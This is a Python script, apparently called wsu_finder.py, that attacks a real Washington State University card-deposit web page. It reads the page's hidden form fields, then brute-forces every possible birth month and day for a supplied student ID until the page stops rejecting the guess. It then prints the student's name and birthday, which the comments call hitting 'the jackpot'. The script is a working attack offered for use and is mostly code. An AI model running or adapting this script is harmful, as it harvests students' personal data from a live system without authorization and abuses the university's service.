import sys

import requests
from bs4 import BeautifulSoup

from birthdays import birthdays

ENDPOINT = "https://livingat.wsu.edu/cardinfo/deposit/default.aspx?mode=CC"

s = requests.session()


# TODO: Async requests
def get_info_for_wsu_id(wsu_id):
    response = s.get(ENDPOINT)
    bs = BeautifulSoup(response.text, 'html.parser')

    # Get hidden inputs to recreate request
    # No CSRF token because no login required
    view_state = bs.find(id="__VIEWSTATE").get('value')
    prev_page = bs.find(id="__PREVIOUSPAGE").get('value')  # Mayn't be necessary
    event_val = bs.find(id="__EVENTVALIDATION").get('value')

    for birthday in birthdays:
        # Brute force every possible birthday for the WSU ID
        print(f"Trying {birthday} on ID {wsu_id}")
        response = s.post(
            ENDPOINT,
            data={
                # Hidden fields
                "__EVENTTARGET": "ctl00$mainContent$btnContinue",
                "__VIEWSTATE": view_state,
                "__PREVIOUSPAGE": prev_page,
                "__EVENTVALIDATION": event_val,
                # POST data that user would usually provide
                "ctl00$mainContent$txtWSUID": wsu_id,
                "ctl00$mainContent$DropDownListMonth": birthday.month,
                "ctl00$mainContent$DropDownListDay": birthday.day,
            },
        )

        if "Birthday is incorrect" not in response.text:  # TODO: Better check
            # We hit the jackpot
            bs = BeautifulSoup(response.text, 'html.parser')
            name = bs.find(id="ctl00_mainContent_lblName").text.lstrip(" - ")
            return name, birthday
    else:
        raise ValueError(f"{wsu_id} has no birthday! It probably doesn't exist")


def main():
    try:
        print(get_info_for_wsu_id(sys.argv[1]))
    except IndexError:
        print("Usage: python wsu_finder.py wsu_id")
    except Exception:
        print(f"Invalid argument {sys.argv[1]}")
        raise


if __name__ == '__main__':
    main()
